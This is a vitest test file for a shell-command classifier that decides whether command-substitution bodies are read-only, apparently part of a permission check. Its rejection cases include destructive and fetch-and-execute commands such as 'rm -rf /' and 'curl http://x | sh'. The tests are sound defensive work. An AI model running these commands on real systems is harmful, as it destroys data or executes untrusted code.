/**
 * isReadOnlySubshellText — classification of command-substitution bodies.
 *
 * Contract: the evaluator receives ALL extracted inner texts (each nested
 * $()/backtick contributes its own entry), so this function judges a single
 * body of text. A body is "clean" only when every command in it belongs to
 * the read-only set and it contains no write redirect, backgrounded list, or
 * multi-line list. Anything unrecognized fails closed.
 */
import { describe, expect, it } from "vitest";
import { isReadOnlySubshellText } from "../analysis/segment-helpers";

describe("isReadOnlySubshellText: clean (pure data production)", () => {
  it("read-only pipeline", () => {
    expect(isReadOnlySubshellText("grep -n x f | cut -d: -f1")).toBe(true);
  });

  it("input redirect is allowed (its target is path-checked separately)", () => {
    expect(isReadOnlySubshellText("wc -c < MEMORY.md")).toBe(true);
  });

  it("single read-only command", () => {
    expect(isReadOnlySubshellText("basename a/b")).toBe(true);
    expect(isReadOnlySubshellText("pwd")).toBe(true);
  });

  it("operators inside quotes do not split", () => {
    expect(isReadOnlySubshellText('grep "a\\|b" f')).toBe(true);
    expect(isReadOnlySubshellText('grep "a && b" f')).toBe(true);
  });

  it("list operators chain read-only commands", () => {
    expect(isReadOnlySubshellText("ls /tmp && cat /tmp/x")).toBe(true);
    expect(isReadOnlySubshellText("grep x f || grep y f")).toBe(true);
    expect(isReadOnlySubshellText("ls /tmp |& grep x")).toBe(true); // |& tee-pipe, not background
  });

  it("env-assignment prefix does not hide the command", () => {
    expect(isReadOnlySubshellText("VAR=1 grep x f")).toBe(true);
  });

  it("no-space pipeline", () => {
    expect(isReadOnlySubshellText("grep x f|cut -f1")).toBe(true);
  });

  it("null-redirect is not a write", () => {
    expect(isReadOnlySubshellText("ls > /dev/null")).toBe(true);
  });

  it("nested substitution: outer body text may look clean, but the nested\n node's own text is checked separately by the evaluator", () => {
    // Standalone, the outer body's first word is echo — but the evaluator
    // receives ["echo $(rm x)", "rm x"] and the second entry fails.
    expect(isReadOnlySubshellText("echo $(rm x)")).toBe(true);
    expect(
      ["echo $(rm x)", "rm x"].every(t => isReadOnlySubshellText(t)),
    ).toBe(false);
  });
});

describe("isReadOnlySubshellText: dirty (fail closed)", () => {
  it("write commands", () => {
    expect(isReadOnlySubshellText("rm -rf /")).toBe(false);
    expect(isReadOnlySubshellText("touch f")).toBe(false);
  });

  it("code execution", () => {
    expect(isReadOnlySubshellText("curl http://x | sh")).toBe(false);
    expect(isReadOnlySubshellText("python3 -c 'print(1)'")).toBe(false);
    expect(isReadOnlySubshellText("bash -c id")).toBe(false);
    expect(isReadOnlySubshellText("eval id")).toBe(false);
  });

  it("find is excluded (-exec/-delete can execute or delete)", () => {
    expect(isReadOnlySubshellText("find . -name x")).toBe(false);
  });

  it("wrappers are excluded (delegated command not visible)", () => {
    expect(isReadOnlySubshellText("timeout 5 grep x f")).toBe(false);
    expect(isReadOnlySubshellText("xargs rm")).toBe(false);
  });

  it("flag-dependent commands stay excluded", () => {
    expect(isReadOnlySubshellText("sed -i 's/a/b/' f")).toBe(false);
    expect(isReadOnlySubshellText("sort -o out f")).toBe(false);
  });

  it("write redirects", () => {
    expect(isReadOnlySubshellText("grep x f > out")).toBe(false);
    expect(isReadOnlySubshellText("grep x f >> out")).toBe(false);
    expect(isReadOnlySubshellText("ls &> out")).toBe(false);
  });

  it("backgrounded list separators", () => {
    expect(isReadOnlySubshellText("ls & rm -rf /")).toBe(false);
    expect(isReadOnlySubshellText("ls & cat x")).toBe(false);
  });

  it("multi-line lists", () => {
    expect(isReadOnlySubshellText("grep x f\ncat g")).toBe(false);
  });

  it("unknown/relative-path commands", () => {
    expect(isReadOnlySubshellText("myscript.sh")).toBe(false);
    expect(isReadOnlySubshellText("./script.sh")).toBe(false);
  });
});
